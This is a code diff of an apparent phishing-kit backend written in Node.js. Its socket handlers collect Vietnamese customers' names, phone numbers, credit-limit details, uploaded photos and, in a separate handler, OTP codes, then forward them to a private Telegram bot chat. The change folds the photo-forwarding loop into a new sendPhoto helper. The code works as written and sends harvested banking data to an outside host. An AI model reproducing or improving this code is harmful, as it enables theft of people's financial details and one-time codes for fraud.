@@ -25,37 +25,20 @@ io.on("connection", function (socket) {
     uploader.on("saved", function (event) {
         socket.emit('file', event.file.pathName);
     });
-    socket.on('service', (data) => {
+    socket.on('service', async (data) => {
         // send data to api telegram
         const message = `Có yêu cầu từ khách hàng: ${data.name} - Số điện thoại ${data.phone} - hạn mức hiện tại ${data.limit_now} - hạn mức khả dungh ${data.limit_total} - hạn mước mong muốn ${data.limit_increase}`;
-        axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
             chat_id: process.env.TELEGRAM_CHAT_ID,
             text: message,
             mode: 'html'
-        }).then((res) => {
+        })
 
-        }).catch((err) => {
-            // console.log('err', err);
-        });
+        await sendPhoto(data.images);
 
-        // send data images
-        const images = data.images;
-        images.forEach(async (image) => {
-            image = image.replace('public', '');
-            await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-                chat_id: process.env.TELEGRAM_CHAT_ID,
-                photo: `${process.env.URL_IMAGE}/${image}`
-            }).then((res) => {
-
-                // console.log('res', res.data);
-            }).catch((err) => {
-                // console.log('err', err);
-                socket.emit('error', { message: 'Hệ thống đang quá tải, vui lòng thử lại sau!' });
-            });
-            socket.emit('success', { message: 'Đã gửi yêu cầu thành công' });
-
-        });
+        socket.emit('success', { message: 'Đã gửi yêu cầu thành công' });
     });
+
 
     socket.on('otp', (data) => {
         // send data to api telegram
@@ -75,6 +58,15 @@ io.on("connection", function (socket) {
 
     });
 });
+const sendPhoto = async (photos) => {
+    const promises = photos.map(async (photo) => {
+        return await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+            chat_id: process.env.TELEGRAM_CHAT_ID,
+            photo: photo,
+        });
+    });
+    return Promise.all(promises);
+}
 
 
 app.get('/', (req, res) => {
